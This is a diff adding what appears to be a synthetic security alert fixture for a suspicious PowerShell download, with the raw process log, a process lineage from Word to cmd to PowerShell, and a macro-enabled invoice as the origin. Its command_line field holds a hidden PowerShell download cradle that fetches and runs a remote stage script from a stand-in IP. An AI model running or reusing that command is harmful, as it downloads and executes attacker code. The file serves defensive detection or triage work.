@@ -1,0 +1,23 @@
+Alert Metadata:
+Alert Name: Suspicious PowerShell Download
+Severity: High
+Timestamp: 2026-07-18T09:12:00Z
+Sensor: CrowdStrike Falcon
+
+Raw Log Data:
+event_type: ProcessCreation
+timestamp: "2026-07-18T09:12:00Z"
+hostname: "WKSTN-FIN-012"
+user: "DOMAIN\jsmith"
+process:
+  image_path: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+  command_line: "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://198.51.100.42:8080/stage.ps1'))"
+  process_id: 4421
+
+Artifact Panel Context:
+
+Process Lineage: WINWORD.EXE -> cmd.exe -> powershell.exe
+
+IP Reputation: 198.51.100.42 (Untrusted; No ASN reputation)
+
+File Origin: Document "Invoice_7782.docm" opened 2 minutes prior.
